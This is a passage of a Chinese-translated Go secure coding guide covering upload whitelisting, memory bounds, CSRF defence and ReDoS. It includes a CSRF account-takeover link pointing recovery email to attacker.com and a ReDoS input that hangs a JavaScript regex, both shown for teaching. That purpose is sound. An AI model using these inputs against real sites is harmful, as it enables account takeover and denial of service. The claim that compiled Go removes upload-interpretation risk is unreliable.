+<p>文件上传应该仅限于经过身份验证的用户。在确保文件上传仅能由经过身份验证的用户完成之后，安全性的另一个重要方面是，确保只有白名单中的文件类型才能上传到服务器。可以使用以下检测MIME类型的Go函数进行此检查：<code>func DetectContentType(data []byte) string</code></p>
+<p>附加了一个读取文件并识别其MIME类型的简单程序。最相关的部分如下：</p>
+<pre><code class="go">{...}
+// Write our file to a buffer
+// Why 512 bytes? See http://golang.org/pkg/net/http/#DetectContentType
+buff := make([]byte, 512)
+
+_, err = file.Read(buff)
+{...}
+//Result - Our detected filetype
+filetype := http.DetectContentType(buff)
+</code></pre>
+
+<p>在识别文件类型之后，根据允许的文件类型的白名单，验证文件类型。 在该示例中，这在以下部分中实现：</p>
+<pre><code class="go">{...}
+switch filetype {
+case &quot;image/jpeg&quot;, &quot;image/jpg&quot;:
+  fmt.Println(filetype)
+case &quot;image/gif&quot;:
+  fmt.Println(filetype)
+case &quot;image/png&quot;:
+  fmt.Println(filetype)
+default:
+  fmt.Println(&quot;unknown file type uploaded&quot;)
+}
+{...}
+</code></pre>
+
+<p>用户上传的文件不应该存储在应用程序的Web上下文中。相反，文件应该存储在内容服务器或数据库中。需要注意的是，所选的文件上传路径不具有执行权限。</p>
+<p>如果承载用户上传的文件服务器基于<code>*NIX</code>，请确保实现chrooted环境等安全机制，或将目标文件目录挂载为逻辑驱动器。</p>
+<p>同样，由于Go是一种编译语言，因此不存在上传包含可在服务器端解释的恶意代码的文件的常见风险。</p>
+<p>在动态重定向的情况下，不应该传递用户数据。如果你的应用程序需要它，则必须采取其他措施来确保应用程序的安全性。这些检查包括只接受正确验证的数据和相对路径url。</p>
+<p>此外，在将数据传递到动态重定向时，一定要确保目录和文件路径映射到预定义的路径列表的索引，并使用这些索引。</p>
+<p>永远不要将绝对文件路径发送给用户，始终使用相对路径。</p>
+<p>将有关应用程序文件和资源的服务器权限设置为只读，当上传文件时，扫描该文件，查找病毒和恶意软件。</p>
+<h2 id="_60">内存管理</h2>
+<p>关于内存管理，有几个重要方面需要考虑。遵循OWASP指南，我们必须采取的保护应用程序措施的第一步，是检查用户的输入/输出。这些措施需确保不允许任何恶意内容。有关此方面的更详细概述，请参阅本文档的<a href="https://checkmarx.gitbooks.io/go-scp/input-validation/">输入验证</a>和<a href="https://checkmarx.gitbooks.io/go-scp/output-encoding/">输出编码</a>部分。</p>
+<p>关于内存管理的另一个重要方面是缓冲区边界检查。在处理接受大量字节进行复制的函数时，通常在c风格的语言中，必须检查目标数组的大小，以确保写入的内容不会超过分配的空间。在Go中，<code>String</code>等数据类型不以<code>NULL</code>结尾，对于String，其<code>header</code>包含以下信息：</p>
+<pre><code class="go">type StringHeader struct {
+    Data uintptr
+    Len  int
+}
+</code></pre>
+
+<p>尽管如此，必须进行边界检查（例如在循环时）。如果我们超出了设定的界限，go会抛出<code>Panic</code>。</p>
+<p>一个简单的例子：</p>
+<pre><code class="go">func main() {
+    strings := []string{&quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;, &quot;ddd&quot;}
+    // Our loop is not checking the MAP length -&gt; BAD
+    for i := 0; i &lt; 5; i++ {
+        if len(strings[i]) &gt; 0 {
+            fmt.Println(strings[i])
+        }
+    }
+}
+</code></pre>
+
+<p>输出：</p>
+<pre><code class="go">aaa
+bbb
+ccc
+ddd
+panic: runtime error: index out of range
+</code></pre>
+
+<p>当我们的应用程序使用资源时，还必须进行额外的检查，以确保它们已经关闭，而不仅仅是依赖于垃圾收集器。这适用于处理连接对象、文件句柄等。在Go中，我们可以使用<code>Defer</code>来执行这些操作。<code>Defer</code>中的指令只在周围函数执行完成时执行。</p>
+<pre><code class="go">defer func() {
+    // Our cleanup code here
+}
+</code></pre>
+
+<p>有关<code>Defer</code>的更多信息可以在文档的<a href="https://checkmarx.gitbooks.io/go-scp/error-handling-logging/">错误处理</a>部分中找到。</p>
+<p>还应避免使用已知的易受攻击的函数。在Go中，<code>Unsafe</code>包中包含这些函数。 这些函数不应该用于生产环境，在包中也不应该使用，包括<code>Testing</code>包。</p>
+<p>另一方面，内存回收是由垃圾收集器处理的，这意味着我们不必担心它。有趣是，手动释放内存是可能的，尽管不建议这样做。</p>
+<p>引用<a href="https://github.com/golang/go/issues/13761">Golang Github</a>：</p>
+<blockquote>
+<p>如果您真的想使用Go手动管理内存，请基于<code>syscall.Mma</code>或<code>cgo malloc/free</code>实现你自己的内存分配器。
+对于像Go这样的并发语言，长时间禁用GC通常是一个糟糕的解决方案。Go的GC未来只会更好。</p>
+</blockquote>
+<h2 id="_61">通用编码实践</h2>
+<h3 id="_62">跨站请求伪造</h3>
+<p>根据<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">OWASP的定义</a>，"跨站点请求伪造(CSRF)是一种攻击，它迫使终端用户在当前经过身份验证的web应用程序上执行不需要的操作。"</p>
+<p>CSRF攻击的目标不是窃取数据，而是状态更改请求。通过一些社交工程(比如通过电子邮件或聊天分享链接)，攻击者可能会欺骗用户执行不需要的Web应用程序操作，比如更改帐户的恢复email。</p>
+<h4 id="_63">攻击场景</h4>
+<p>假设<code>foo.com</code>使用<code>HTTP GET</code>请求设置帐户的恢复email：</p>
+<pre><code class="html">GET https://foo.com/account/recover?email=me@somehost.com
+</code></pre>
+
+<p>一个简单的攻击场景可能是这样的：</p>
+<blockquote>
+<ol>
+<li>
+<p>受害者通过<code>https://foo.com</code>进行身份验证</p>
+</li>
+<li>
+<p>攻击者通过链接向受害者发送聊天消息</p>
+</li>
+</ol>
+</blockquote>
+<pre><code class="html">https://foo.com/account/recover?email=me@attacker.com
+</code></pre>
+
+<blockquote>
+<p>3.受害者的帐户恢复email地址被更改为<code>me@attacker.com</code>，攻击者完全控制它</p>
+</blockquote>
+<h4 id="_64">问题</h4>
+<p>将HTTP方法从<code>GET</code>更改为<code>POST</code>(或任何其他)都不能解决这个问题，URL重写或HTTPS也不能解决这个问题。</p>
+<p>这个攻击的原因是因为服务器不能区分合法用户在会话期间发出的请求和"恶意"的请求。</p>
+<h4 id="_65">解决方案</h4>
+<ul>
+<li><strong>理论上</strong></li>
+</ul>
+<p>如前所述，CSRF针对的是状态更改请求，对于Web应用程序，大多数情况下都是提交表单发出的<code>POST</code>请求。</p>
+<p>在此场景中，当首次请求呈现表单的页面时，服务器计算一个<a href="https://en.wikipedia.org/wiki/Cryptographic_nonce">随机数</a>(打算使用一次的任意数字)。然后，这个token作为字段包含在表单中(大多数时候这个字段是隐藏的，但不是强制性的)。</p>
+<p>然后，当提交表单时，隐藏字段与其他用户输入一起发送。 服务器验证，令牌是否是请求数据的一部分，是否有效。</p>
+<p>该随机数/token应符合以下要求：</p>
+<pre><code>每个用户会话唯一
+大的随机值
+由加密安全随机数生成器生成
+</code></pre>
+
+<p><strong>注意：</strong> 虽然<code>HTTP GET</code>请求不会改变状态(称为幂等)，但是由于糟糕的编程实践，它们实际上可以修改资源，因此也应该成为CSRF攻击的目标。</p>
+<p>在处理API时，<code>PUT</code>和<code>DELETE</code>是CSRF攻击的另外两个常见目标。</p>
+<ul>
+<li><strong>练习</strong></li>
+</ul>
+<p>手工完成这一切不是一个好主意，因为它很容易出错。</p>
+<p>大多数Web应用程序框架已经提供了开箱即用的功能，建议您启用它，或者，不使用框架，单独使用它。</p>
+<p>以下示例是用于go编程语言的 <a href="http://www.gorillatoolkit.org/">Gorilla web工具包</a> 的一部分。你可以在GitHub上找到 <a href="https://github.com/gorilla/csrf">gorilla/csrf</a>。</p>
+<pre><code class="go">package main
+
+import (
+    &quot;net/http&quot;
+
+    &quot;github.com/gorilla/csrf&quot;
+    &quot;github.com/gorilla/mux&quot;
+)
+
+func main() {
+    r := mux.NewRouter()
+    r.HandleFunc(&quot;/signup&quot;, ShowSignupForm)
+    // All POST requests without a valid token will return HTTP 403 Forbidden.
+    r.HandleFunc(&quot;/signup/post&quot;, SubmitSignupForm)
+
+    // Add the middleware to your router by wrapping it.
+    http.ListenAndServe(&quot;:8000&quot;,
+        csrf.Protect([]byte(&quot;32-byte-long-auth-key&quot;))(r))
+    // PS: Don't forget to pass csrf.Secure(false) if you're developing locally
+    // over plain HTTP (just don't leave it on in production).
+}
+
+func ShowSignupForm(w http.ResponseWriter, r *http.Request) {
+    // signup_form.tmpl just needs a {{ .csrfField }} template tag for
+    // csrf.TemplateField to inject the CSRF token into. Easy!
+    t.ExecuteTemplate(w, &quot;signup_form.tmpl&quot;, map[string]interface{}{
+        csrf.TemplateTag: csrf.TemplateField(r),
+    })
+    // We could also retrieve the token directly from csrf.Token(r) and
+    // set it in the request header - w.Header.Set(&quot;X-CSRF-Token&quot;, token)
+    // This is useful if you're sending JSON to clients or a front-end JavaScript
+    // framework.
+}
+
+func SubmitSignupForm(w http.ResponseWriter, r *http.Request) {
+    // We can trust that requests making it this far have satisfied
+    // our CSRF protection requirements.
+}
+</code></pre>
+
+<p>OWASP有一个详细的<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#Synchronizer_.28CSRF.29_Tokens">跨站点请求伪造(CSRF)预防备忘单</a>，建议你阅读。</p>
+<h3 id="_66">正则表达式</h3>
+<p>正则表达式是一种广泛用于搜索和验证的强大工具。在web应用程序上下文中，它们通常用于输入验证（例如电子邮件地址）。</p>
+<blockquote>
+<p>正则表达式是一种用于描述字符串集的表示法。当特定字符串在正则表达式描述的集合中时，我们经常说正则表达式与字符串匹配。(<a href="https://swtch.com/~rsc/regexp/regexp1.html">来源</a>)</p>
+</blockquote>
+<p>所周知，正则表达式很难掌握。有时，看似简单的验证，可能会导致<a href="https://checkmarx.gitbooks.io/go-scp/general-coding-practices/regular-expressions.html#regular-expression-denial-of-service-redos">拒绝服务</a>。</p>
+<p>与其他编程语言不同，Go的作者对此非常重视，他选择用<a href="https://github.com/google/re2/wiki">RE2</a>来实现<a href="https://golang.org/pkg/regexp/">regex标准包</a>。</p>
+<h4 id="re2">为什么是RE2</h4>
+<blockquote>
+<p>RE2的设计和实现具有一个明确的目标，即能够在没有风险的情况下，处理来自不受信任用户的正则表达式。(<a href="https://github.com/google/re2/wiki/WhyRE2">来源</a>)</p>
+</blockquote>
+<p>考虑到安全性，RE2还保证了线性时间性能和优雅的失败：解析器、编译器和执行引擎可用的内存是有限的。</p>
+<h4 id="_67">正则表达式拒绝服务攻击</h4>
+<blockquote>
+<p>正则表达式拒绝服务(ReDoS)是一种引发拒绝服务(DoS)的算法复杂度攻击。ReDos攻击是由正则表达式引起的，该表达式需要很长时间来进行计算，其计算时间与输入大小呈指数级相关。在计算过程中，这一异常长的时间是，由于使用的正则表达式的实现算法，例如递归回溯表达式。(<a href="https://www.checkmarx.com/2018/05/07/redos-go/">来源</a>)</p>
+</blockquote>
+<p>你最好阅读完整的文章“<a href="https://www.checkmarx.com/2018/05/07/redos-go/">深入研究Go中的正则表达式拒绝服务(ReDoS)</a>)”，因为它深入研究了这个问题，并包含了大多数流行的编程语言之间的比较。在本节中，我们将关注一个真实世界的用例。</p>
+<p>由于某些原因，你正在寻找一个正则表达式来验证注册表单上提供的电子邮件地址。在快速搜索之后，你在RegExLib.com上找到了这个用于<a href="http://regexlib.com/REDetails.aspx?regexp_id=1757&amp;AspxAutoDetectCookieSupport=1">电子邮件验证的正则表达式</a>：</p>
+<blockquote>
+<p><code>^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$</code></p>
+</blockquote>
+<p>如果你尝试将john.doe@somehost.com与此正则表达式匹配，您可能会确信它能够满足你的需求。 如果你正在使用Go开发，你会想出类似的东西：</p>
+<pre><code class="go">package main
+
+import (
+    &quot;fmt&quot;
+    &quot;regexp&quot;
+)
+
+func main() {
+    testString1 := &quot;john.doe@somehost.com&quot;
+    testString2 := &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;
+    regex := regexp.MustCompile(&quot;^([a-zA-Z0-9])(([\\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$&quot;)
+
+    fmt.Println(regex.MatchString(testString1))
+    // expected output: true
+    fmt.Println(regex.MatchString(testString2))
+    // expected output: false
+}
+</code></pre>
+
+<p>运行结果：</p>
+<pre><code class="go">$ go run src/redos.go
+true
+false
+</code></pre>
+
+<p>如果你正在使用JavaScript开发呢?</p>
+<pre><code class="javascript">const testString1 = 'john.doe@somehost.com';
+const testString2 = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!';
+const regex = /^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$/;
+
+console.log(regex.test(testString1));
+// expected output: true
+console.log(regex.test(testString2));
+// expected output: hang/FATAL EXCEPTION
+</code></pre>
+
+<h4 id="_68">少了什么</h4>
+<p>如果您具有其他编程语言(如Perl、Python、PHP或JavaScript)的背景，则应该了解正则表达式支持的特性之间的差异。</p>
+<p>RE2不支持只有回溯解决方案存在的构造，例如<a href="https://www.regular-expressions.info/backref.html">回溯引用</a>和<a href="https://www.regular-expressions.info/lookaround.html">查找</a>。</p>
+<p>考虑以下问题：验证任意字符串是否是格式正确的HTML标记：a)开始和结束标记名称匹配，b)开始和结束标记之间可以有一些文本。</p>
+<p>满足要求b)很简单<code>.*?</code>，但是a)具有挑战性，因为结束标记匹配取决于匹配的开头标记。 这正是Backreferences允许我们做的事情。 检查下面的JavaScript实现：</p>
+<pre><code class="javascript">const testString1 = '&lt;h1&gt;Go Secure Coding Practices Guide&lt;/h1&gt;';
+const testString2 = '&lt;p&gt;Go Secure Coding Practices Guide&lt;/p&gt;';
+const testString3 = '&lt;h1&gt;Go Secure Coding Practices Guid&lt;/p&gt;';
+const regex = /&lt;([a-z][a-z0-9]*)\b[^&gt;]*&gt;.*?&lt;\/\1&gt;/;
+
+console.log(regex.test(testString1));
+// expected output: true
+console.log(regex.test(testString2));
+// expected output: true
+console.log(regex.test(testString3));
+// expected output: false
+</code></pre>
+
+<p><code>\1</code>将保存<code>([A-Z][A-Z0-9]*)</code>先前捕获的值。</p>
+<p>这是你不应该期望在Go中做的事情：</p>
+<pre><code class="go">package main
+
+import (
+    &quot;fmt&quot;
+    &quot;regexp&quot;
+)
+
+func main() {
+    testString1 := &quot;&lt;h1&gt;Go Secure Coding Practices Guide&lt;/h1&gt;&quot;
+    testString2 := &quot;&lt;p&gt;Go Secure Coding Practices Guide&lt;/p&gt;&quot;
+    testString3 := &quot;&lt;h1&gt;Go Secure Coding Practices Guid&lt;/p&gt;&quot;
+    regex := regexp.MustCompile(&quot;&lt;([a-z][a-z0-9]*)\b[^&gt;]*&gt;.*?&lt;\/\1&gt;&quot;)
+
+    fmt.Println(regex.MatchString(testString1))
+    fmt.Println(regex.MatchString(testString2))
+    fmt.Println(regex.MatchString(testString3))
+}
+</code></pre>
+
+<p>运行上面的Go源代码示例应该会导致以下错误：</p>
+<pre><code class="go">$ go run src/backreference.go
+# command-line-arguments
+src/backreference.go:12:64: unknown escape sequence
+src/backreference.go:12:67: non-octal character in escape sequence: &gt;
+</code></pre>
+
+<p>你可能会想要修复这些错误，并提出以下正则表达式：</p>
+<pre><code class="go">&lt;([a-z][a-z0-9]*)\b[^&gt;]*&gt;.*?&lt;\\/\\1&gt;
+</code></pre>
+
+<p>然后，你将得到：</p>
+<pre><code class="go">go run src/backreference.go
+panic: regexp: Compile(&quot;&lt;([a-z][a-z0-9]*)\b[^&gt;]*&gt;.*?&lt;\\/\\1&gt;&quot;): error parsing regexp: invalid escape sequence: `\1`
+
+goroutine 1 [running]:
+regexp.MustCompile(0x4de780, 0x21, 0xc00000e1f0)
+        /usr/local/go/src/regexp/regexp.go:245 +0x171
+main.main()
+        /go/src/backreference.go:12 +0x3a
+exit status 2
+</code></pre>
+
+<p>在从头开始开发一些东西时，你可能会在缺少一些特性时，发现很好的解决方案。另一方面，移植现有软件，你可能会寻找标准正则表达式包的完整功能替代方案，可能会找到(例如：<code>dlclark</code>/<code>regexp2</code>)。请记住，你可能会失去RE2的“安全特性”，比如线性时间性能。</p>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../api-security-design/" title="API网关设计" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                API网关设计
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../xss/" title="Xss" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Xss
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright 2018-2099
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/application.9e1f3b71.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../../.."}})</script>
+      
+    
+    
+      
+    
+  </body>
+</html>
